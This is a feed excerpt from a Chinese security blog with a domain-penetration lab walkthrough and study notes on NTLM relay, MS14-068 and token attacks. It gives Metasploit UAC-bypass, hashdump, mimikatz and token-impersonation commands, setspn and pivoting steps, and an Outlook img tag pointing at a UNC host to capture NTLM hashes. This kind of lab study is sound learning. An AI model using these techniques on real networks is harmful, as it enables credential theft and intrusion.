<p>这里有Wing仔在先知上的翻译<a href="https://xz.aliyun.com/t/2519">文章</a>，很详细，我就不搬运了。自己目前知道的比较狭窄，如下：</p>
<ul>
<li>本地提权漏洞，如ms15_051</li>
<li><strong>Bypassuac</strong>（对windows 7、8以上getsystem均需要bypass）</li>
<li>令牌窃取</li>
<li>HASH（有密码当然可以...）</li>
</ul>
<h4 id="补丁获取">补丁获取</h4>
<p>上主机，运行 <code>systeminfo</code> ，补丁如下：</p>
<pre><code class="language-txt">[01]: KB2999226
[02]: KB958488
[03]: KB976902
</code></pre>
<p>一般情况下...会是比较多的补丁吧，这时候可以到<a href="https://bugs.hacking8.com/tiquan/">提权辅助网页</a>进行搜索（类似于在线的exploit_suggester :） ）</p>
<h4 id="漏洞尝试">漏洞尝试</h4>
<p>补丁很少，感觉随便抓一个就能打，于是先用<code>post/multi/recon/local_exploit_suggester</code> 看一看，结果如下：<br>
<img src="https://chriskalix.github.io/post-images/1594016571241.png" alt="" loading="lazy"><br>
用 <code>ms15_051</code> 进行尝试<br>
<img src="https://chriskalix.github.io/post-images/1594016576216.png" alt="" loading="lazy"><br>
...竟然失败了，误以为payload设置错误，来回尝试均无果。这时候怀疑可能是360拦截，这时候看到了别WP，说可能是 UAC 的问题(虽然我不知道怎么看的，因为我好像没有弹框...)。<br>
UAC的知识点没有看过，这次靶机遇到了，稍微补习一下（毕竟是笔记嘛~熟悉的朋友们可以跳过这个部分）</p>
<h5 id="额外补充-uac">额外补充-UAC</h5>
<h6 id="uac简介">UAC简介</h6>
<p>UAC(User Account Control)即用户账户控制，是在Windows Vista以及更高版本上采用的一种控制机制。其原理是通过通知用户是否对应用程序使用硬盘驱动器和系统文件授权(平时熟悉的弹框)，以达到帮助阻止恶意程序损坏系统的效果 -- 摘抄</p>
<h6 id="bypassuac">bypassuac</h6>
<p>从这篇<a href="https://www.cnblogs.com/Chesky/p/UAC_Bypass.html">文章</a>里摘抄出了 bypassuac 的常见方法，其实在小y师傅的<a href="https://github.com/xiaoy-sec/Pentest_Note">Pentest_Note</a>里也记录了许多</p>
<ul>
<li>白名单提权机制</li>
<li>DLL劫持</li>
<li>Windows自身提权漏洞</li>
<li>远程注入</li>
<li>COM接口技术</li>
</ul>
<h6 id="msf">MSF</h6>
<blockquote>
<p>从内网安全攻防摘抄了部分</p>
</blockquote>
<p>运行 <code>exploit/windows/local/bypassuac</code> ，获得了新的 <code>session</code> ，在新的 <code>session</code> 中getsystem获取权限。</p>
<p>[*] 注1：bypassuac模块会产生多个文件，容易被杀软识别。使用 bypassuac_injection 模块直接运行在内存的反射DLL中，不会接触到目标机器硬盘，降低了被检测出的概率<br>
[*] 注2：bypassuac的前提为，当前用户必须在管理员组中（该靶机在管理员组），且UAC为默认配置（仅在程序试图修改我的计算机时通知我）</p>
<h4 id="权限获取-2">权限获取</h4>
<p>其实在刚刚的 <code>local_exploit_sugguester</code> 中就展示了一个方法 <code>bypassuac_eventvwr</code> ，其实用 <code>bypassuac</code> 也能成功，截图如下<br>
<img src="https://chriskalix.github.io/post-images/1594016584867.png" alt="" loading="lazy"></p>
<h4 id="进程迁移">进程迁移</h4>
<blockquote>
<p>将进程迁移至稳定的SYSTEM进程中</p>
</blockquote>
<p>刚开始不懂，看着教程直接迁移到了explorer.exe，没有认真看权限，结果降权了...这时候内心有个问题，进程迁移是可以迁移到任意进程嘛？ZhuDongFangYu.exe也可以作为目标嘛？<br>
这边为了好玩，迁移到了主动防御...群里师傅推荐的是 <code>svchost.exe</code> 和 <code>csrss.exe</code> ，我查了一下大概是做啥的，记录了记录了...</p>
<h3 id="4-凭证获取">4. 凭证获取</h3>
<blockquote>
<p>这里直接使用msf来做，其余的方式在博客的前面几章里有留作介绍</p>
</blockquote>
<h4 id="hashdump">hashdump</h4>
<p>msf中有两种获取hash的方式，分别为<code>hashdump</code>和<code>smart_hashdump</code>。两者的区别为 hashdump仅能导出本地的hash，而smart_hashdump可以导出域用户的hash。但是目前的账户为本机<code>SYSTEM</code> 权限，并不是域用户，所以跑出的没有差别(我认为)<br>
<img src="https://chriskalix.github.io/post-images/1594016593384.png" alt="" loading="lazy"><br>
[*] 注：这里有一个小问题，作者的靶机其实密码都是一样的，而我在登录 WEB这台机器的时候密码不对，猜解后我重置了密码，导致和其他账户都不一样</p>
<h4 id="明文获取">明文获取</h4>
<p>加载mimikatz，用wdigest抓取明文，但是读取不到...<br>
<img src="https://chriskalix.github.io/post-images/1594016599218.png" alt="" loading="lazy"><br>
这时候纳闷了，为什么和别人说的不一样...把错误的信息复制出来，用bing去搜，发现可能是进程位数问题 - <a href="https://security.stackexchange.com/questions/137002/error-when-using-metasploit-mimikatz-module">文章</a><br>
好吧...我就不应该尝试迁移到x86进程里的，这时候重新迁移一下，到<code>csrss.exe</code> 上，重新获取<br>
由于<code>WEB\de1ay</code>的密码被我修改过，且后续不会使用到，所以这里截取部分（在<a href="https://www.anquanke.com/post/id/193193">文章</a>中，直接在本机抓到了域管账号密码...我没有啊...不过没关系）<br>
<img src="https://chriskalix.github.io/post-images/1594016604606.png" alt="" loading="lazy"></p>
<h3 id="5-令牌利用失败">5. 令牌利用（失败）</h3>
<blockquote>
<p>当然可以尝试扫描内网，然后打CVE，SMB爆破等等...其实均可成功的~，但是作者的靶机上写到了Access Token的利用，我们还是试一试吧~（毕竟目标不是快速通关）</p>
</blockquote>
<p>在msf下 <code>load incognito</code> ，<code>list_tokens -u</code> 查看一下，如下：</p>
<p><img src="https://chriskalix.github.io/post-images/1594016720508.png" alt="" loading="lazy"><br>
这里其实有个小插曲，我看了<code>steal_token</code>这个操作，就去尝试了一下，结果这个meterpreter就好像变&quot;坏&quot;了（无法执行任何操作，均deny）...埋个坑，后续看看<br>
通过模拟令牌，切换到 <code>DE1AY\mssql</code> 用户下<br>
<img src="https://chriskalix.github.io/post-images/1594016727153.png" alt="" loading="lazy"><br>
但这个时候在meterpreter里什么操作都不行了（变坏了）...可是作者的文章里明明提到了 <code>Access Token利用（MSSQL利用）</code> ...为什么会不行呢...希望指教哇...<br>
本来我的思路是从这里切换到mssql权限，然后 <code>ms14-068</code> ，结果只能换个方法了~~</p>
<p><strong>[*]</strong> 遗留问题：这里是为什么（这样是不是不对啊..）....</p>
<h3 id="6-内网探测">6. 内网探测</h3>
<blockquote>
<p>关于信息获取的姿势有很多，腾讯前几天的<a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">文章</a>写的非常全，当然里面包括的不止是信息收集这一部分，可以当作备忘录实时翻看了</p>
</blockquote>
<h4 id="spn获取">SPN获取</h4>
<p>指令 <code>setspn -T de1ay.com -Q */*</code> ，快速获取域内注册的服务，如下：</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1594016733477.png" alt="" loading="lazy"></figure>
<p>看到域内有DC,PC,WEB三台主机。很明显DC就是域控啦（当然，应该用别的方式加以识别，例如<code>net time /domain</code>等等...），有了域名就能快速发现域内机器的IP，也不用挂上代理慢慢扫描了...</p>
<h4 id="主机端口探测">主机端口探测</h4>
<p>刚才已经发现了所在的内网网段，在msf里添加上网段。<br>
<code>run autoroute -s 10.10.10.0/24</code> ，这边可以挂上socks，然后用proxychains + nmap，或者传工具(nbtscan)等等都可以。<br>
由于已经知道域内主机的地址（SPN扫描发现），直接用 <code>auxiliary/scanner/portscan/tcp</code> 扫一下两台主机，结果如下<br>
<img src="https://chriskalix.github.io/post-images/1594016738827.png" alt="" loading="lazy"></p>
<h3 id="7-漏洞尝试">7. 漏洞尝试</h3>
<blockquote>
<p>看到了445和3389异常兴奋...于是想照着域控先来一发</p>
</blockquote>
<h4 id="永恒之蓝">永恒之蓝</h4>
<p>看到 <code>SMB</code> 第一时间想到的就是永恒之蓝，10.10.10.10 是 <code>DC</code> ，当然想法是一把梭。但是msf的模块在windows 2008以上会有问题，模块无法正常load进来，这个可以在 metasploit github上的<a href="https://github.com/rapid7/metasploit-framework/issues/13478">issue</a>里找到。<br>
这时候打 <code>10.10.10.201</code> 那台 <code>PC</code> 也无法成功，情况未知...很是头疼。在星球里问了，换上了 <code>doublepulsar</code> ，仍然无果<br>
这难道就没有办法了嘛~其实github上有NSA泄露的原版，可以拖上去继续尝试...为了快捷，我先尝试别的...</p>
<h4 id="cve-2019-0708">CVE-2019-0708</h4>
<p>先用校验模块尝试看一看<br>
<img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5Cclass2%5C14.png" alt="" loading="lazy"></p>
<p>域控没有3389的问题，PC有问题。那么上手去打一下，这边注意因为是用的vmware起的环境，所以target要重新设定为当前vmware的版本（默认的Automatic不行），这里又头疼了...因为我的VM是15.5.6的，target里没有......</p>
<p>做到这里有点郁闷了...因为MS17017没有成功（其实可以的，只是msf上的模块有问题），难道只有用 psexec 了嘛.</p>
<h3 id="8-横向移动">8. 横向移动</h3>
<p>这边其实垮掉了。上去一看环境崩坏，捣鼓半天很是痛苦，果然做靶机最最痛苦的就是环境问题。下面拉跨的给出正解文章</p>
<ul>
<li><a href="http://www.adminxe.com/888.html">文章1</a></li>
<li><a href="https://www.anquanke.com/post/id/193193">文章2</a></li>
</ul>
<p>因为域的问题（不太清楚是因为修改了密码还是中间的误操作），导致本机上应该能抓到域管账号密码却没有了~花费了很多时间看环境的问题，还是比较痛苦的...下一步决定去看xq17表哥的文章，搭建域环境摸一遍，附上一个第一次做成功的图吧...累了累了...</p>
<p><img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5Cclass2_11.png" alt="" loading="lazy"><br>
毕竟还是比较真实的嘛~~~</p>
<h2 id="0x03-知识点坑点总结">0x03 知识点&amp;坑点总结</h2>
<h3 id="1-知识点">1. 知识点</h3>
<ul>
<li>UAC（bypass）</li>
<li>Access Token</li>
<li>SPN</li>
<li>GPP</li>
<li>psexec | wmi</li>
<li>hashdump (Wdigest)</li>
</ul>
<h3 id="2-坑点">2. 坑点</h3>
<ul>
<li>mimikatz抓不到</li>
<li>进程迁移位数</li>
<li>ms17017</li>
<li>环境问题，十分痛苦</li>
</ul>
<h2 id="0x04-后续思考">0x04 后续思考</h2>
<ol>
<li>日志清理</li>
<li>动作太大</li>
<li>票据存留</li>
</ol>
<p>做完之后原理性的东西需要再加以总结，另外有些虎头蛇尾，还是继续看一看域环境，加深印象</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(三)-思维导图补充]]></title>
        <id>https://chriskalix.github.io/post/3dogm6EPG/</id>
        <link href="https://chriskalix.github.io/post/3dogm6EPG/">
        </link>
        <updated>2020-06-27T07:24:14.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>这段时间看内网基础的时候，看到一个比较好的脑图，忘记从哪里抄来的了...不过作者写的很好，我就跟着梳理一下</p>
</blockquote>
<h2 id="思维导图">思维导图</h2>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593399265693.png" alt="" loading="lazy"></figure>
<h2 id="分类梳理">分类梳理</h2>
<blockquote>
<p>对于已经了解过的就不重复梳理</p>
</blockquote>
<h3 id="ntlm系列">NTLM系列</h3>
<h4 id="中间人">中间人</h4>
<blockquote>
<p>Net-NTLM可通过中间人+hashcat破解</p>
</blockquote>
<h5 id="前置知识">前置知识</h5>
<h6 id="中间人相关">中间人相关</h6>
<p>LLMNR（Link-Local Multicast Name Resolution）：</p>
<ul>
<li>主机在自己的内部名称缓存中查询名称。如果在缓存中没有找到名称，那么主机就会向自己配置的主DNS服务器发送查询请求。如果主机没有收到回应或收到了错误信息，主机还会尝试搜索配置的备用DNS服务器。如果主机没有配置DNS服务器，或者如果在连接DNS服务器的时候没有遇到错误但失败了，那么名称解析会失败，并转为使用LLMNR</li>
<li>主机通过用户数据报协议(UDP)发送多播查询，查询主机名对应的IP地址，这个查询会被限制在本地子网(也就是所谓的链路局部)内</li>
<li>链路局部范围内每台支持LLMNR，并且被配置为响应传入查询的主机在收到这个查询请求后，会将被查询的名称和自己的主机名进行比较。如果没有找到匹配的主机名，那么计算机就会丢弃这个查询。如果找到了匹配的主机名，这台计算机会传输一条包含了自己IP地址的单播信息给请求该查询的主机</li>
</ul>
<p><strong>简单来说，DNS名称服务器请求失败时，就会通过链路本地多播名称解析（LLMNR）以及Net-BIOS名称服务，试图在本地进行名称解析</strong></p>
<p>NBT-NS（Netbios Name Service）：</p>
<ul>
<li>与上述基本相同</li>
</ul>
<p><strong>二者区别</strong>：</p>
<ul>
<li>NetBIOS基于广播，而LLMNR基于多播</li>
<li>NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有WindowsVista和更高版本才支持LLMNR</li>
<li>LLMNR还支持IPv6，而NetBIOS不支持，因此，在启用了IPv6，但对IPv6管理不如IPv4那样细致的复杂网络中，就可能发生更广泛的攻击</li>
</ul>
<h6 id="挑战认证相关">挑战认证相关</h6>
<p>SSPI（Security Service Provider Interface）：</p>
<p>​	这是Windows定义的一套接口，定义了安全有关的函数功能，包括但是不限于</p>
<ul>
<li>身份认证机制</li>
<li>为其他协议提供的Session security机制</li>
<li>...</li>
</ul>
<p>SSP（Security Service Provider）：</p>
<p>​	SSPI的实现者，微软实现了以下的SSP</p>
<ul>
<li>NTLM SSP</li>
<li>Kerberos</li>
<li>Cred SSP</li>
<li>...</li>
</ul>
<h5 id="从理论上理解">从理论上理解</h5>
<p>使用工具 <code>Responder</code>，在内网环境下，假设用户访问一个不存在的UNC路径，则最后会在局域网内发送LLMNR（或者NBNS？）请求，<code>Responder</code> 的作用就是回复这些请求，那么用户和攻击机（即<code>Responder</code>所在机器）发起质询和响应，可以截获到NLTMv2 SSP。</p>
<p>在本机测试后，即使弹出了登录框，输入密码后还是NTLMv2 SSP，因为是NTLM认证呀...可能和设置有关吧（其他文章里直接获取了明文密码），埋一个坑，后续再看。</p>
<h6 id="缺点">缺点</h6>
<ol>
<li>感觉触发的概率不是很大</li>
<li>跑的不是NTLM Hash，是NTLM-v1/v2 Hash，只能通过本地用Hashcat跑，比硬件</li>
</ol>
<h5 id="参考文章">参考文章</h5>
<p><a href="https://blog.csdn.net/wxh0000mm/article/details/105997105">发起NTLM</a></p>
<ul>
<li>Outlook ：<code>&lt;img src=&quot;\\172.16.100.1\outlook&quot;&gt;</code></li>
<li>OFFICE ：钓鱼可用</li>
<li>Mysql：load_file同样支持unc</li>
</ul>
<h3 id="kerberos系列">Kerberos系列</h3>
<h4 id="ms14-068">MS14-068</h4>
<p>首先补丁为<code>kb3011780</code><br>
原理：用户在向KDC申请TGT的时候，申明自己有域管理员权限，而KDC没有校验该票据的签名，导致权限提升。-&gt;从&lt;&lt;内网安全攻防&gt;&gt;摘录<br>
但是思考了以下觉得不对啊，看Kerberos认证里，第一步的时候如果申请了，AS会校验用户hash。查阅其他人的文章，找到如下：<br>
Client向AS(KDC)发送KRB_AS_REQ请求时，申请一张不包含PAC的TGT票据。并在Client向TGS发送KRB_TGS_REQ请求时，重新构造高权限TGT及PAC发送给TGS，TGS会返回一个新的TGT。<br>
那么发现了，其实申请TGT是第二部，书里也写了，只是我没看到...</p>
<h3 id="token系列">Token系列</h3>
<p>分类：</p>
<ul>
<li>Delegation Tokens授权令牌</li>
<li>Impersonation Tokens模拟令牌</li>
</ul>
<p><code>注：用户注销后会切换至模拟令牌，不会注销</code></p>
<p>我认为这个是本地登录过administrator的情况才有？</p>
<p>常见的<code>msf</code>操作：</p>
<ul>
<li><code>load incognito</code></li>
<li><code>list_tokens -u</code></li>
<li><code>impoersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code>（这里为上述列举出的token，如果存在就直接提权成功）</li>
</ul>
]]></content>
    </entry>
</feed>